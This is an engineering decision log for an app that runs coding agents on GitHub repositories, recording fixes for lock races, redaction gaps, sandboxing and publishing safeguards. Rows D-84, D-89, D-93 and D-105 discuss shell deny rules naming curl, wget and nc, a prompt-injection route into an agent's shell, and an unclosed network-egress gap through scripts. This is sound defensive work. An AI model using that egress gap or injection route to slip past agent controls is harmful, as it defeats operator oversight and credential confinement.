| D-74 | Run startup shares the clone lock | `POST /run` mutated the shared clone without holding `commit.clone_lock`: `_build_driver` runs `git checkout -B` — the exact operation that lock's own docstring names as the race it prevents. The run-status gate is not a substitute, because a run is not yet "running" while `_build_driver` is still doing git work, so a Start click could land inside the draft route's materialize → commit → draft window and move HEAD under it. The lock now wraps the whole of `_build_driver` (split into `_build_driver_locked` so the acquisition is one visible statement and a later early-`return` cannot skip it), which also covers any caller that goes through that function. (An earlier version of this row claimed it covered the calibrate path; it does not — `_calibrate_loop` has its own checkout and never calls `_build_driver`. Fixed separately in D-80.) Behavioral test: with the lock held elsewhere, startup must not reach the checkout within 1s, then must reach it once released — plus a re-entrancy test, since an ordinary `Lock` would self-deadlock when a holder calls in. |
| D-75 | Chat sessions do not collide across repositories | `sessionKey` was `kind-id` while `store.sessions_dir` puts records at the DATA ROOT on purpose ("a chat session ... may reference any repo, so it is not scoped to the active one"). So repo A's PR #1 and repo B's PR #1 were ONE record: discuss A, retarget to B, discuss its #1, and `loadRecord('pr-1')` resumed A's conversation about a different pull request. Worse for the singleton subjects — the ruler row passes `id: 'current'`, so `ruler-current` was shared by every repository the app was ever pointed at. The key is now `kind-repo-id` with the repo slugged through the same filename-safety pass (a traversal-shaped repo cannot reintroduce a separator, and a missing repo yields `norepo` rather than an empty segment). Two of the five new tests fail pre-fix. |
| D-76 | The profile import stays lazy | Hoisting `from ..profiles import build_profile` to module scope per AUTOSDE `top-level-imports` is DECLINED, with the cost measured: `runner` is on the gateway BOOT path (`__init__` → `routes` → `runner`, all module scope), importing `runner` pulls 268 modules, and importing `github_repo.profile` pulls **116 more** — so hoisting puts the whole profile+spine tree into every gateway boot and every CLI invocation that never starts a run. That is what `profiles.build_profile`'s docstring says the lazy import is for, and what `test_perf_boot_path.py` ratchets. There is a real cycle too (the profile imports back into `..backend`). The repo's own precedent (`computer-use.md` on `macos_ffi.py`) is that the rule governs where the import STATEMENT sits, and deferring work that must not run at module scope is legitimate. Two tests pin it, including one that measures the property in a clean interpreter rather than trusting the statement's position; verified both fail when the hoist is actually applied. |
| D-77 | Retarget is atomic with run startup | `POST /setup-clone` checked "is a run live?", then cloned (slow: network + git), then persisted the new `clone`/`target_url`; `POST /run` read config independently. A Start click landing inside the clone window read the OLD config and launched against the repository being replaced, while the dashboard — reading config after the persist — showed the new one, so the run's artifacts hung off a different `workspace_key` than the UI displayed. The busy check cannot close this: it only asks whether a run is ALREADY live, and here the run starts afterwards. Both sides now take the shared clone lock — setup across ONE `_clone_and_persist` section (two separate acquisitions would leave the same window between them), run startup across config-read → `start`. Three tests: both halves structurally, plus a behavioral one proving a run cannot reach the clone while a retarget holds the lock. |
| D-78 | The sandbox import is hoisted (and the test that hid behind it fixed) | The function-local `from kiro_crew.sandbox import ...` in `profile.py` is hoisted — unlike D-76, this module is already off the boot path (it is what the lazy `build_profile` defers), `kiro_crew.sandbox` is ALREADY in `sys.modules` by the time it loads, there is no cycle, and `spine/agent_runner.py` already imports the same names at module scope, so the two were merely inconsistent. Hoisting exposed a latent test defect: `test_the_gate_requests_strict_mode` patched `kiro_crew.sandbox` (where the name is DEFINED), which only worked while the import was function-local — after the hoist the patch no-ops and the test asserted nothing. Measured: `KeyError: 'mode'`. Repointed to the consuming module, and verified load-bearing by re-probing the wrong target and watching it fail. |
| D-79 | A successful manual draft leaves no commit behind | The draft route reset the clone on every FAILURE path but not on success. `GitHubPRRecipe.draft` publishes with `git push HEAD:refs/heads/<generated>`, which never moves the LOCAL branch, so the candidate commit stayed checked out. Measured on a real bare repo: drafting finding-1 then finding-2 put BOTH commits on finding-2's pushed branch and its diff touched finding-1's file. A second manual draft happens to rescue itself (`materialize_queued_diff` re-checkouts from a freshly fetched base); the path that does NOT recover is a later RUN, because `clone_setup.checkout_branch` early-returns "already on <branch>" without resetting — so the run adopts the leftover commit as its baseline. This is D-70's defect in the operator-triggered route, and unlike D-71's perf case there is no cumulative-measurement argument: a manual draft is one discrete publish action. Ledger row is written BEFORE the reset, since it is the only durable record the PR exists. The test anchors on the success arm specifically — counting `_rollback()` calls would have passed pre-fix, which already had three on failure paths. |
| D-80 | Calibration holds the clone lock | `_calibrate_loop` does its OWN `checkout_branch` and never goes through `_build_driver`, so D-74's lock did not reach it — a claim made when D-74 landed that was simply wrong, recorded here as such. Calibration is the longest clone-holding operation in the app (checkout, then `baseline_samples` running the target's whole suite N times), so a manual draft mutating the clone underneath it yields a ruler calibrated across two different revisions. The whole loop body is now inside the lock, not just the checkout: guarding only the checkout would look correct while leaving the part that needs a stable tree exposed. Three tests, including a positional one asserting the lock is entered before BOTH the checkout and the measurement — anchored on the actual call sites (`clone_setup.checkout_branch(`, `.baseline_samples(`) because a bare substring match hit the explanatory comment instead, a false positive observed while writing it. |
| D-81 | Terminal run errors are redacted | `_state.error` reached the dashboard unscanned while `_state.activity` on the SAME response object was redacted — one field guarded, one not. `status()` serializes `"error": st.error` and `SetupPanel` renders it verbatim (`run?.error || t('runError')`), and the string is `f"{type(exc).__name__}: {exc}"` — an exception message routinely quotes what failed (a git url, a subprocess argv, a path), so a run dying on an agent-influenced value carried a credential to the browser. All exception-derived sites now go through one `_fail` helper: redact via the FAIL-CLOSED `_redact_activity`, then compose the exception TYPE back in so the message stays actionable. The canary's non-clear message is deliberately NOT routed — every value it interpolates is numeric by construction (`float(...)`, `compute_noise_band`) and it is not an exception — and carries an explicit `redaction-exempt` marker so the structural guard can tell "reviewed" from "missed". That guard excludes `_fail` by SOURCE RANGE rather than by the variable name, so renaming cannot open a hole; verified it fails when a raw assignment is reintroduced. |
| D-82 | Repository setup actually succeeds (closure-scoping regression) | Wrapping clone+persist in an inner `_clone_and_persist` for D-77's lock introduced a `NameError`: that inner function binds its OWN local `result`, while `_persist` still read `result` as a FREE variable of the enclosing handler — a cell nothing ever filled. Every successful `POST /setup-clone` raised `NameError: free variable 'result' referenced before assignment`, surfacing as a 500 with the clone on disk and `config.json` never written: the app's front door could not be completed at all. Reproduced standalone, then through the real route (500). `result` is now an explicit PARAMETER. Root cause of the miss is worth recording: every prior test of this route drove a refusal (409 mid-run) or read the source with `inspect.getsource`, so nothing ever EXECUTED the persist — a structural test cannot catch a scoping bug. The new test exercises the success path end to end and asserts the persisted config, not just the 200. An AST sweep over the whole app for the same shape (an inner function reading a name a sibling binds locally) found no other instance. |
| D-83 | A failed export does not delete the work | `_run_watcher`'s `finally` deleted the isolated clone unconditionally while `_export_fix` is best-effort (its own docstring: "a failed export is a lost patch"). Together those are DATA LOSS: the clone's origin is dead by design, so the queue patch is the only durable copy of a pass's commits — an unwritable queue meant a completed, verified agent pass was destroyed by a filesystem hiccup with nothing to retry from. `_export_is_durable` now reports whether a copy actually landed (checking the artifact, since `_export_fix` swallows its own errors, and treating a no-diff pass as no loss) and the clone is RETAINED when work went unexported. The orphan sweeper had to change too — it kept only LIVE watchers' clones, so it would have reclaimed the retained directory on the next pass and undone the fix; a test asserts it still reclaims a genuine orphan, so the fix did not just disable it. |
| D-84 | Bash stays; the nested-process route is closed at the credential | Removing `Bash` from the watcher's allowed tools is DECLINED even though the shell denylist inspects only the REQUESTED command — premise confirmed by measurement (`python helper.py`, `make test`, `./run.sh` are all ALLOWED, while `gh pr comment` is refused). DECLINED, because removing Bash deletes the feature: the watcher's prompt requires the repo's build/test/lint commands, `gh pr view --comments`, `gh pr checks`, `gh run view --log-failed`, a rebase and a local commit. The escalation is blocked one layer down instead, where it is enforced rather than pattern-matched: `strip_credential_env` removes GH_TOKEN/GITHUB_TOKEN/GITHUB_ENTERPRISE_TOKEN, and `sandboxed_spawn_argv(mode="strict")` hides `~/.config/gh` — the stored-OAuth route a token strip alone would miss. Measured: the host's `~/.config/gh` holds `hosts.yml`, yet a nested `subprocess` in the sandbox lists it EMPTY and a nested `gh auth status` returns "You are not logged into any GitHub hosts" (rc=1). Three tests pin both routes and that the spawn still goes through them. |
| D-85 | Distinct repositories get distinct workspaces | `_slugify` maps every non-alphanumeric run to `_`, so different repositories collapsed onto ONE workspace key. Measured: `owner/a-b`, `owner/a_b`, `owner/a.b`, `owner/a--b` and `owner/a b` all produced `owner_a_b`. GitHub permits both `-` and `_`, so those are unrelated repositories — and the ledger, ruler, results and PR QUEUE all hang off this key, so a manual draft could apply and push one repository's queued diff into another. Branches collapsed the same way (`feat/x-1` vs `feat/x_1`). Fixed by appending a 10-char digest of the UNSLUGGED repo + normalized branch: the readable slug stays in front so the directory is still recognizable, the digest carries the distinction. Lower-cased before hashing because GitHub repo names are case-insensitive, so `owner/A-B` and `owner/a-b` must keep sharing a workspace — asserted, along with the pre-existing `origin/main` == `main` normalization the digest must not break. Side effect worth recording: this surfaced a latent defect in `test_profile_capture.py`, whose empty-suite case took only `tmp_path` and so — unlike its siblings — never pinned `store.data_dir`, reading and writing the DEVELOPER'S real data home and keying off whatever repo was configured there. Order-dependent by construction; now isolated. |
| D-86 | A configured diff scope never fails open | The scope refusal was gated on a ref-RESOLVABILITY check, so it only fired for a base that does not exist. A base that resolves but whose diff FAILS still left `_scope is None`, and `None` means "unscoped" — widening the edit fence from "what this branch changed" to the whole repository, the exact inversion of what a scope is for. Reproduced: with two unrelated histories, `rev-parse --verify <ref>` exits 0 while `diff <ref>...HEAD` exits 128 "no merge base". This is the THIRD variant of one bug on this branch (unresolvable ref → empty diff → git error), so the guard now keys on the CONSEQUENCE ("a scope was configured but could not be computed") instead of enumerating causes. `_ref_resolves` was deleted with it: its documented purpose was precisely the distinction the fix abandons, so leaving it would mislead — its `BENIGN_SPAWNS` entry went too (that audit has a staleness check). One existing test asserted the old cause-specific wording and was re-anchored on the consequence. |
| D-87 | A failed PR-head checkout refuses the clone | `setup_isolated_clone` logged a failed `git checkout <head-branch>` at DEBUG and carried on, leaving the clone on the shared clone's HEAD — normally the BASE branch. Every other failure in that function fails closed (a failed clone errors; an un-neutralizable origin deletes the tree and errors); this one did not, and the harm is the same class: the watcher reads the base tree, "fixes" code the PR never touched, and exports a patch computed against the wrong revision. Measured on a real repo: after `checkout <missing-branch>` the tree still reports HEAD `main` with base content, so nothing downstream can detect it. Reachable rather than hypothetical — the loop's own reset paths can drop a generated bug-PR branch from the shared clone before a watcher clones from it. Now removes `dest` and returns an error; a second test pins that a valid head branch still yields the PR's content, so the refusal did not break the normal path. |
| D-88 | MCP error paths are redacted | Tool RESULTS were scanned; the ERROR paths beside them were not — the same asymmetry as D-81, on a second surface. `handle` interpolated `str(exc)` into both the SEL record and the JSON-RPC error, and tool ARGUMENTS reach exception text by design (`_tool_get_finding` raises "no finding with fingerprint <fp>" with the caller's raw value). Reproduced end to end: `get_finding` with `fp="aws_secret_access_key=AKIA…"` returned that credential verbatim to the model. All error strings now go through one fail-closed `_redact_error` — the SAME redactor the results use, rather than a second ad-hoc one — with the exception type composed in afterwards so the message stays actionable. A FOURTH site review did not name (the schema validator, which quotes the offending value) was fixed with them. The structural guard walks the AST rather than lines, because the operator's multi-line `print(..., file=sys.stderr)` — a local diagnostic that crosses no egress boundary and is deliberately left unscrubbed — cannot be told apart from a model-facing `return` by a line filter; verified both guards fail when a raw `str(exc)` is reintroduced. |
| D-89 | Discovery has no shell | Discovery ran with `allowed_tools=["Read", "Grep", "Glob", "Bash"]` under a comment reading "read-only investigation". `Bash` is write-capable and this agent runs in the SHARED clone — the tree the loop later stages and commits from — so a prompt-injection in the target repository's own source (which discovery exists to READ) could edit it, and a later `git add -A` would publish an edit no measurement gated. `allowed_tools` also AUTO-APPROVES, so such a call never reaches the governance chokepoint. Removed. The prompt was corrected too: it had offered "read-only Bash: `sed -n`, `grep`, `git grep`" — that instruction was GUIDANCE while the grant permitted writes, and leaving it would advertise a tool the agent no longer has. (My first test asserted the prompt never mentioned a shell; it did, so that claim was wrong and the test now asserts the narrower, true property: it must not offer shell COMMANDS the agent cannot run.) |
| D-90 | The MCP server launches on every platform | `app.json` hard-coded `"command": "python3"`, which does not exist on a native Windows install (a venv there ships `python.exe`, no `python3.exe`), so the spawn fails ENOENT and every auto-improvement MCP tool goes silently missing. Review proposed `"python"`; that is still wrong for two reasons this repo already documents — `mcp_gateway/rewriter.py` bakes `sys.executable` in precisely because "a `python3` on PATH that can import `kiro_crew` is [not] guaranteed" (kiro-cli strips env when spawning MCP subprocesses), and `platform_compat._is_windows_store_python_stub` exists because Windows `which("python")` can resolve a 0-BYTE Store reparse point. So registration now RESOLVES a bare `python`/`python3`/`py` to the running interpreter (`bridges.resolve_stdio_command`), beside the existing HTTP url rewrite. An absolute path, `node` or `docker` is left alone — that was a deliberate choice — and HTTP entries are untouched. |
| D-91 | Publication survives a ledger failure | A pull request is IRREVERSIBLE the moment `draft()` returns, but both publish paths appended a ledger row with nothing catching a failure — so a full disk after publication turned a SUCCESSFUL publish into a raised exception. In `pr_pipeline` the raise propagated out of the cycle, recording the new PR nowhere; since the ledger is the only dedup store, the next cycle re-discovers the same locus and files a DUPLICATE. In the manual route it was worse, and it was MY OWN D-79 fix that made it so: D-79 deliberately ordered the ledger write BEFORE `_rollback()` so a reset could never run in the row's place, which meant a raising ledger skipped the rollback and stranded the commit on the branch — the exact defect D-79 fixed, reached through a different door. Both writes are now best-effort and logged at ERROR (a missing row is what causes the duplicate), and the manual path's reset moved into `finally`, which is STRICTER than D-79's placement rather than a relaxation. D-79's own test was re-anchored on the `finally` accordingly. |
| D-92 | Watcher and session snapshots are redacted | The watcher LOG ring is scanned on WRITE (`pr_watchers._log`), but the `as_dict()` SNAPSHOT beside it was served raw — a third instance of the "one field on a response is scanned, its neighbour is not" asymmetry behind D-81 and D-88. `as_dict` carries `target`/`title`/`lastNote`/`verdict`/`verdictReason`/`fixing`, all model- or pull-request-derived, and the watcher ingests PR text as untrusted input BY DESIGN. Measured with a credential-shaped `target`: it reached the browser verbatim through both the reconcile listing and the start response. Both now go through the `_redact_tree` this module already uses for findings, rather than a fourth mechanism. Review named those two sites; checking their siblings found THREE more — the chat-session list/get/save responses, because `save_session` merges the caller's patch and the stored `title` is built from a finding's `target`. `get_log` deliberately stays as-is: scanning at the point of write is stronger. Side note worth keeping: the posture disclosure I first wrote for this contained a real access-key literal and `test_security_posture` REJECTED it — the disclosure is itself scanned, which is the contract working as intended. |
| D-93 | The governance gate gets both deny inputs | `_governance_denial` dropped two inputs the central gate needs. (1) It built its config with `HooksConfig.from_dict(cfg.hooks)`, which reads only the config.json section — the operator's denied-command state lives in the keystone `denied_commands.json`, "the sole source, so an agent that edits config.json cannot affect the deny ceiling", and `hooks_config_from_config_dict` exists to overlay it. Measured with an operator rule in the keystone file: `from_dict` yielded `[]` where the helper yielded `['^curl\\s']`, so a custom denied command was silently unenforced for the UNATTENDED agent — the caller that most needs it. (2) `is_shell=bool(command)` made the gate's own deny-by-default branch unreachable: `HookManager.on_tool_call` denies when `is_shell and not command` because a shell tool with an unrecoverable command must not be judged on its LLM-authored title (`acp/types.py` states that contract), and deriving the flag from the command inverted exactly that case. Now reads the event's flag, keeping the command-derived signal as a fallback so a caller that sets only `command` still gates. Four tests: both defects, plus two premise tests that MEASURE the config-builder difference and confirm the real `HookManager` denies an unrecoverable shell command. |
| D-94 | A run cannot double-start | `start`/`calibrate` assigned `self._thread = thread` inside the lock but called `thread.start()` after releasing it, while every "is a run active?" guard tested `is_alive()`. Verified directly: an assigned-but-unstarted thread reports `is_alive() == False`, so in that window every guard read INACTIVE and two concurrent requests could both pass — two workers mutating one clone and overwriting each other's `RunState`. The lock re-check did not help; it asked the same question. Fixed with an explicit `_reserved` flag set under the lock. First attempt cleared it when `start()` returned, which was still wrong (liveness only becomes true once the OS schedules the thread), so the WORKER now releases it as its first act — handing off to `is_alive()` with no gap — and a spawn failure clears it so a failed start cannot wedge the supervisor as permanently busy. |
| D-95 | Setup cannot retarget a run that started meanwhile | `_handle_setup_clone` checked for a live run BEFORE acquiring `clone_lock`, so the check and the mutation were not atomic with each other. D-77 made setup and run-startup mutually exclusive, which was necessary but NOT sufficient: mutual exclusion decides who goes first, it does not re-validate the precondition after waiting. A setup request that passed the check and then blocked on the lock for the length of a driver build would clone and persist a new target underneath the now-active run, stranding its artifacts in the old workspace. The status is now re-checked inside the lock via a synchronous `_run_is_active()` (the async helper cannot be awaited from the worker thread that holds the lock), and the refusal maps to 409 `run_in_progress` rather than the 400 `invalid_repo_url` every other error string means — the operator's URL was fine, the timing was not. |
| D-96 | Config writes cannot race run startup | `PUT /config` had the same pre-lock-only guard D-95 fixed in `POST /setup-clone`: it refused while a run was live, then applied the patch with no lock and no re-check. `branch` is in `_CONFIG_WRITABLE` and `store.workspace_key()` reads config FRESH on every path lookup, so a write landing between two helper calls sends the ruler, results, ledger and PR queue to DIFFERENT workspaces within ONE run. D-68 closed the "already running" case; the earlier guard cannot see the "starts while we are writing" case because the run does not exist yet when it checks. Same remedy as D-95 — take `clone_lock`, re-check `_run_is_active()` inside it, 409 on conflict — deliberately reusing the pattern rather than inventing a third, since this is the FOURTH handler to need it. A structural test now asserts both workspace-mutating handlers carry the lock and the in-lock recheck, so a fifth hand-rolled copy cannot drift. |
| D-97 | A refused commit says so | The commit route answers a refusal with HTTP 400 + `{code, error}` (protected branch, push-policy denial, run in progress), but the client's `mutationFn` was `.then(r => r.json())` with no `res.ok` check and no `onError` — so every refusal resolved as SUCCESS: react-query ran `onSuccess`, the pulse stopped, and the operator saw no change and no reason. Now checks `res.ok`/`ok:false`, throws, and the row renders `commitFinding.error` scoped by `variables` so a stale message cannot sit under an unrelated finding. Verified the new test fails against the pre-fix `mutationFn`. |
| D-98 | An irreversible publish is confirmed and labelled | The commit control was an icon-only 13px `GitCommitVertical` at identical visual weight to the harmless Discuss icon beside it, and it pushed to the configured branch — irreversible once published — with no prompt. Now confirms first, naming the BRANCH (the fact that makes the action safe or not), and carries a text label. The confirm copy is a CATALOG key, not a literal: `englishIdentity` forbids hardcoded `confirm()` strings because they are call arguments the i18n codemod never saw. Also registered in `destructiveConfirm`'s DESTRUCTIVE list, so all 9 target locales must genuinely translate it — an operator asked to authorize an irreversible remote change in a language they do not read cannot evaluate it. |
| D-99 | Ledger tokens are not row copy | The findings list printed `f.status` raw, so `failed_gate`, `discarded_noise` and `no_defect` — snake_case implementation vocabulary, untranslatable — appeared on every row of the page's densest surface. Mapped to catalog labels ("Rejected by the gate", "Below the noise band", "No defect found") for all 10 statuses in `VALID_STATUSES`, with the raw token as fallback for an unknown one. First attempt wrapped the lookup in a `statusLabel()` helper, which `check-i18n-keys` REJECTED: it could no longer resolve the key set, so the site became exempt from every i18n check — worse than the raw token. Re-done as an inline `i18nT(MAP[k])`, matching the `McpToolsPanel` precedent the gate's own error message names. |
| D-100 | A failed diff is not mistaken for no work | D-83's own durability check carried the defect D-83 exists to prevent. `_export_is_durable` read empty diff stdout as "this pass produced nothing, so nothing was lost" without checking `returncode` — and a FAILING diff writes to stderr with EMPTY stdout (measured: `git diff <missing-ref>...HEAD` prints "fatal: ambiguous argument", stdout empty). So a PR retargeted to an unfetched base made the check report DURABLE, retention never fired, and the clone holding the only copy of the agent's commits was deleted. "No work" and "cannot tell" are different answers and only the first is safe to act on; the artifact is checked first as the strongest signal, then a SUCCEEDING empty diff, and a failure logs and retains. Three tests cover all three branches. |
| D-101 | Only the bug track may add tests | `RepoEditAllowlist`'s docstring promises "the perf track may not touch `tests/**` AT ALL, because the suite is the ruler's measurement subject and editing it is metric gaming the build gate cannot see" — but `__init__` never received the track, so the added-reproducing-test carve-out applied to BOTH. That is precisely the gaming the fence exists to stop: the RH guard compares collected test COUNTS, so adding one cheap test while an expensive one stops being collected keeps the count equal while measured suite time drops, and a purely artifactual "win" is drafted as a real perf PR. The carve-out is now gated on `TRACK_BUG` (where it is load-bearing — a fix without a reproducing test cannot be proven RED→GREEN), the parameter defaults to `TRACK_BUG` so an omitted argument is the restrictive-for-perf choice, and a structural test asserts the profile actually passes its track. Worth recording: my first assertions compared `allows_changes`'s (ok, offending) TUPLE against a bool, which is always falsy-vs-True and proved nothing — caught by the bug-track case failing, then fixed by unpacking. |
| D-102 | Commit errors reach the browser redacted | The commit route returned `str(result.get("error"))` verbatim, and `commit.py` builds that from `(proc.stderr or '')[:160]` — RAW git stderr, which quotes the ref, the path, and whatever a repository's own hooks printed. Latent while nothing rendered it; **D-97 made it live**: surfacing a refused commit at the finding row so the operator learns why also put subprocess output on the page. A fix that makes an error visible has to make it safe in the same change, or improving the UX is what opens the leak. Review named one site; the same shape appears at five `result.get("error")` responses plus the PR-status body and both draft-path bodies — all the same reader, all closed. A structural guard keyed on `.get("error")` catches a reintroduction (verified). Its first version keyed on the DICT NAME and flagged `str(result.get("detail"))`, which is one of two fixed app-authored strings — a false positive that would have had me redact a constant, so the scan was narrowed rather than the code changed. |
| D-103 | More of the app's tests run in CI (scoped by CI's evidence, not mine) | The Design review found `setup.cfg` collected only 11 of 22 app test files, excluding the ones covering the headline safety controls — those invariants could regress with CI green. Now +4 files, **+114 tests (measured 24,776 → 24,890 collected)**. Getting there took two wrong turns, both worth recording. (1) I first added 7 files claiming the "Author identity unknown" blocker was gone because they passed locally with `GIT_CONFIG_GLOBAL`/`GIT_CONFIG_SYSTEM` emptied. UNSOUND: git falls back to an identity derived from the system account (gecos + user@hostname) that no env var suppresses, so my host could not express a CI runner's failure mode. CI failed 7 tests. `tests/conftest.py` now exports `GIT_AUTHOR_*`/`GIT_COMMITTER_*` session-wide — verified a commit succeeds with both config paths at /dev/null — which fixed 6 of the 7 and is kept. (2) That left two DIFFERENT environment axes CI then exposed: `test_lint_findings.py` needs a real OS sandbox the runner lacks (`SandboxUnavailableError` — a fixture cannot conjure a kernel feature), and `test_dogfood_learnings.py`/`test_pr_watchers.py` assume POSIX (separators, rmtree semantics, `/`-joined module paths) so they fail the Windows shard, which shares this `testpaths`. Both are excluded again, on CI's evidence. Porting ~100 tests to Windows is its own PR, not something to smuggle in here. Standing lesson: **a local environment that cannot express the failure mode cannot verify a fix for it** — when that is the case, ship the smaller provable change and let CI adjudicate. |
| D-104 | A long repo key can still persist a chat link | `_SAFE_KEY_RE` capped the session record key at 128 chars. D-75 changed the client key from `kind-id` to `kind-repo-id` (to stop cross-repository collisions), so it now embeds `owner/repo` — and GitHub allows owner<=39 + repo<=100, making a legitimate PR key ~145 chars. Past 128, `save_session` raised `unsafe session record key` AFTER `openSession` had already seeded the chat slot, so the link was lost and every retry spawned another orphaned chat. Raised to 250, which clears the longest real key while keeping `<key>.json` under the 255-char filesystem component limit — not removed, because the record IS a file. Three tests: a max-length GitHub PR key is accepted, a 260-char key is still rejected, and the character fence (traversal, separators, leading dot) is unchanged. This is a downstream consequence of my own D-75 fix — widening the key exposed a validator that was sized for the old one. |
| D-105 | The watcher's egress limit is disclosed, not silently accepted | Removing `Bash` from the PR watcher stays DECLINED. D-84 proves credentials are confined; the remaining claim it never tested, and re-measuring showed it is CORRECT. Credentials remain confined (a nested process under `mode="strict"` sees `~/.aws`, `~/.config/gh`, `~/.docker` EMPTY on a populated host; `~/.ssh` exposes only `known_hosts` while `id_rsa`/`*.key` stay hidden; nested `gh auth status` reports not-logged-in). But NETWORK EGRESS is not: `CLONE_NEWNET` appears nowhere in `sandbox.py` — whose docstring explains agentic commands need reachable networking — and while `curl`/`wget`/`nc` are denied, `python helper.py` is allowed and can open a socket. A local network probe was inconclusive (this host blocks egress even UNSANDBOXED), so the conclusion rests on the absence of the namespace, not on a passing probe. `Bash` stays because the watcher's four documented jobs are all shell — removing it deletes the feature rather than hardening it — and the residual risk is now WRITTEN DOWN at the `security_posture` disclosure sink and in the module spec: point the watcher only at repositories whose PR comments you would be willing to execute. Four tests pin the half that IS enforced, plus one asserting the disclosure exists, so silence cannot creep back. Closing it properly needs a network-isolating platform primitive, not a private fix in one builtin. Operator decision, taken explicitly. **Superseded in part by D-107**: the "operator accepted it" framing here was wrong, because `GET /watchers` auto-started watchers with no operator action. |
| D-106 | Two non-copy literals exempted from the new ALL-CAPS i18n gate | Main added `eslint.i18n.strict.config.js`, which looks INSIDE all-caps module constants; two of this app's constants tripped it at zero tolerance. Neither is translatable copy, and translating either would BREAK behavior. `QUEUED_PREFIX` (`'QUEUED:'`) is a wire-protocol marker the backend stamps on a queued `pr` value (`spine/profile.py`: `return f"QUEUED:{fingerprint}"`) and the client only `startsWith()`-matches — translating it breaks the match. `FOLDER_PREFIX` (`'Auto-Improve - '`) builds the chat-folder NAME that is ALSO the lookup key (`folders.find(f => f.name === name)`, since there is no upsert endpoint) — translating it would make a language switch miss the existing folder and silently create a second one per language, orphaning every prior session. Both exempted by anchored shape in `words.exclude`, with the reasoning at the site. One detail worth keeping: the space-bearing anchor `'^Auto-Improve - $'` did NOT work, because the plugin trims the literal before matching (`no-literal-string.js`: `const trimed = value.trim()`) — verified by watching the warning persist, then fixed. Confirmed narrow: the patterns match only the two exact literals and reject `Queued`, `queued findings`, `QUEUED: 3 items`, `Auto-Improve`, `Auto-Improve - now`. |
| D-107 | Watchers do not auto-start without an opt-in | `GET /watchers` ran `reconcile_failing_prs(force=True)`, which STARTS a shell-capable watcher for every filed pull request with failing checks — so reading the list spawned agents with no operator action. That invalidated D-105's central claim: the residual egress risk could not be "operator-accepted" when there was no consent moment. Found while re-deriving my own D-105 reasoning after review raised the surface a third time. Promotion is now gated on `watcherAutoStart` (default OFF, mirroring `autoPublish`), read BEFORE the rate gate so a config-off install never even consumes the reconcile window; `Bash` is unchanged so the feature still works for anyone who opts in. One self-inflicted detail fixed in the same pass: the first cut nested the orphan-clone sweep inside the promotion branch, which would have leaked scratch disk on every default-off install and made the docstring's promise false — it is now unconditional, with a test asserting both call sites exist. |
| D-108 | Unresolved review threads actually block auto-publish | The `autoPublish` gate's "no unresolved review comments" condition was structurally unreachable, and its backstop was dead too — two independent key mismatches on one fact. (1) `auto_publish_gate` read `status["unresolvedComments"]`, but `fetch_pr_status` only emits `unresolvedThreads`; an absent key is falsy, so the guard never fired. (2) The value it should have read is itself always 0, because `_count_unresolved` tested `comment.get("isResolved") is False` while the provider writes `resolved`/`resolvable` — so `derive_verdict` never returned PROGRESS for an open thread either. With `watcherAutoStart` + `autoPublish` both on, a green draft carrying an unresolved reviewer thread would reach `gh pr ready` and be marked ready-for-review with a human's question outstanding: fail-OPEN on the one control whose entire job is not publishing over an open question. **Both existing tests were complicit**: `test_reconcile_and_publish` fabricated `unresolvedComments` and `test_pr_checks` fabricated `isResolved` — keys neither the status object nor the provider emits — so the dead guards looked covered. A fixture that invents its own key shape tests nothing but itself; both are realigned to the real payload. `resolvable` is required in the count because a plain issue comment is not a thread and can never be resolved. |
| D-109 | The Apps nav label no longer clips silently | The E2E render gate reported one regression this branch caused: `apps.layout 0 -> 1`, a `layout/clipped-without-title` on the sidebar "Apps" section header (`App.tsx`). The span carries `whitespace-nowrap overflow-hidden` with no `title`, so a translation longer than the row is cut off with no way to read it — surfaced under the en-XA pseudolocale at 2.2x once this branch's app entry narrowed the row. Fixed by adding `title={i18nT('app.apps')}` — though `main` landed the IDENTICAL fix on the same span while this was in flight, so the rebase took `main`'s copy and this branch now carries none of it. Recorded anyway because the finding was real and the diagnosis is the reusable part. Verified by re-running the gate scoped to that surface: exit 0 and NO "surfaces that got worse" section (the 2 remaining `clipped-without-title` findings are pre-existing debt on other surfaces, measured, not mine). |
| D-110 | The branch stopped reverting main's comment cleanup (267 files) | The Inclusive Language gate failed on a non-inclusive pty file-descriptor identifier quoted in a comment at `terminal.py` — a file this feature has no business touching. Diagnosis took three wrong turns worth recording: I first concluded the line was not in my diff (it was), then that CI had used a stale base (it had not). The truth: main's `` DELETED a batch of `(#N)` task-log comment suffixes repo-wide, and my branch still carried the pre-cleanup text — so rebasing replayed my older copy and every one of those deletions came back as an ADDED line, the flagged identifier among them. Measured scope: **837 files vs main, 267 of them outside this feature**. My "behind: 1" reading had been accurate and I under-weighted it; one commit of drift was reverting a repo-wide cleanup. Rebasing onto main's tip took it to **121 files / 9 outside the feature** (app registration, the redaction disclosures, and this app's own tests — all legitimate). Verified with CI's own command: `woke --stdin` over all 38,633 added lines reports **0 errors**. Lesson: a diff-size check against `origin/main` catches an unintended mass revert that per-file gates and a green local suite both miss. |
| D-115 | The draft and commit routes recheck the run status inside the lock | The manual draft (`_handle_draft_pr`) and one-click commit (`_handle_commit`) routes each mutate the shared clone (checkout/apply/reset/push) under `clone_lock`, but each carried ONLY the pre-lock `_refuse_while_running` guard — the exact not-atomic gap D-95/D-96 closed for `POST /setup-clone` and `PUT /config`. The arrival check proves no run was live WHEN THE REQUEST CAME IN, not that none started while it blocked on the lock; a run that starts during that wait is mid checkout/apply/push on the same clone when the draft/commit then runs the identical sequence — two mutations interleaved in one clone, the corruption the guard exists to stop, reached by waiting rather than by racing the loop from arrival. Fixed with the same remedy, deliberately reused: re-check `_run_is_active()` INSIDE `clone_lock` and return 409 `run_in_progress`. `clone_lock` is a re-entrant RLock, so the commit route holds it and lets `commit_finding` re-enter. Five tests: draft rechecks in-lock, commit rechecks in-lock, and a structural guard asserting all FOUR clone-mutating handlers (config/setup/draft/commit) now share the in-lock recheck so a sixth copy cannot skip it (all verified RED pre-fix). This is the same D-95/D-96 pattern extended to the two routes that were still gap. |
